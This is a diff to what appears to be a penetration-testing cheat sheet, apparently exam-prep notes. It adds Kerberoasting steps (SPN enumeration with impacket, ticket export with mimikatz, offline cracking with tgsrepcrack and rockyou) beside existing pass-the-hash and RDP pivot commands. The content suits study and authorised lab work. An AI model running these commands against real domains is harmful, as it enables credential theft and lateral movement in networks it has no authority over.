@@ -267,6 +267,15 @@ Post compromise of the first machine:
     - Pass the hash: 
       - python psexec.py -hashes :<NTLM Hash> <user>@<IP>
           - psexec.py "Administrator":@192.168.11.132 -hashes :920ae267e048417fcfe00f49ecbd4b33
+  - If you have an SPN
+    - Get SPN by running this command from kali: impacket-GetUserSPNs exam.com/apachesvc -dc-ip <DC IP>
+    - On windows machine: PS C:\tmp > Add-Type –AssemblyName System.IdentityModel New-Object
+System.IdentityModel.Tokens.KerberosRequestorSecurityToken –ArgumentList
+'MSSQLSvc/sql01.example.com:1433'
+    - On windows machine: PS C:\tools > .\mimikatz.exe "kerberos::list /export"
+    - Take the resultant kirbi file back to the kali machine
+    - ./tgsrepcrack.py /opt/wordlists/rockyou.txt ../1-40a10000-
+apachesvc@MSSQLSvc~sql01.example.com~1433-example.COM.kirbi
 
 - Pivot from first machine to 2nd 
   - xfreerdp /u:<username> /p:<password> /v:<IP>
